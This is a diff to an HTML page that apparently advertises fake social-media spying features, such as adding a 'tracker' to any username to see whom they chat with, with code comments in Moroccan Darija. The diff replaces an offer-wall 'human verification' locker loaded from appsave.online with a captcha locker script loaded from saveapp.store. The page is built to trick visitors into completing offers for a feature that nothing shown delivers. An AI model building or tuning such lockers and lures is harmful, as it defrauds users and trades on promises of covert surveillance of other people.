@@ -7,8 +7,6 @@
     <link href="https://fonts.googleapis.com/css2?family=SF+Pro+Display:wght=300;400;500;600;700&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     
-    <script type="text/javascript" id="ogjs" src="https://appsave.online/cl/js/grj95p"></script>
-    
     <style>
         :root {
             --bg-color: #0b0b0b;
@@ -539,24 +537,6 @@
         .final-offer-title { font-size: 20px; font-weight: 700; margin-bottom: 10px; letter-spacing: -0.5px; color: #34c759; }
         .final-offer-desc { font-size: 13px; color: var(--text-sub); line-height: 1.5; margin-bottom: 24px; font-weight: 300; }
         .final-offer-desc span { color: var(--text-main); font-weight: 600; }
-        
-        .btn-final-verify {
-            width: 100%;
-            background: linear-gradient(135deg, #34c759 0%, #28a745 100%);
-            border: none;
-            padding: 16px;
-            border-radius: 16px;
-            color: #ffffff;
-            font-weight: 600;
-            font-size: 16px;
-            cursor: pointer;
-            box-shadow: 0 8px 24px rgba(52, 199, 89, 0.3);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 10px;
-        }
-        .btn-final-verify:active { transform: scale(0.97); }
 
         @keyframes scaleUp { from { opacity: 0; transform: scale(0.92); } to { opacity: 1; transform: scale(1); } }
     </style>
@@ -682,7 +662,6 @@
                 </div>
             </div>
 
-            <!-- 📷 Hna t9addet b Capital S "Snaping.jpg" bach i-matchi l-file direct f GitHub live -->
             <div class="feature-card" onclick="handleCardClick('Add Tracker To Any Username', 'You will see on their profile when they are chatting with anyone (only 1 person at a time).', 'fa-user-secret', 'Snaping.jpg')">
                 <div class="badge pro">PRO</div>
                 <div class="thumb-wrapper"><i class="fa-solid fa-user-secret thumb-icon-placeholder"></i></div>
@@ -770,13 +749,13 @@
                 <div class="loading-status" id="loadingStatus">LOADING INSIGHT COUNTERS...</div>
             </div>
 
+            <!-- Hna t-clona design locker l-jdid f blast l-botton l-9dim kima f image.png -->
             <div class="final-offer-box" id="finalOfferBox">
                 <h3 class="final-offer-title">System Synced Successfully!</h3>
-                <p class="final-offer-desc">To access the full configuration layer and download logs, you must complete <span>(1) offer</span> below to verify you are a human. Once completed, your requested layout will reveal instantly here.</p>
+                <p class="final-offer-desc" style="margin-bottom: 15px;">To access the full configuration layer, please complete the verification below.</p>
                 
-                <button class="btn-final-verify" onclick="callOgadsLocker()">
-                    <i class="fa-solid fa-shield-checkmark"></i> Complete Final Verification
-                </button>
+                <!-- Hna l-captcha locker kay-loada b had l-div direct -->
+                <div data-captcha-enable="true" style="margin: 0 auto;"></div>
             </div>
         </div>
     </div>
@@ -957,14 +936,9 @@
                 }
             }, 35);
         }
-
-        function callOgadsLocker() {
-            if (typeof og_load === 'function') {
-                og_load(); 
-            } else {
-                window.location.href = "https://appsave.online/cl/i/grj95p";
-            }
-        }
     </script>
+
+    <!-- Script dyal Captcha Locker jdid men image.png f l-lekhkhaj dyal body -->
+    <script type="text/javascript" src="https://saveapp.store/cp/js/2wx2k"></script>
 </body>
 </html>
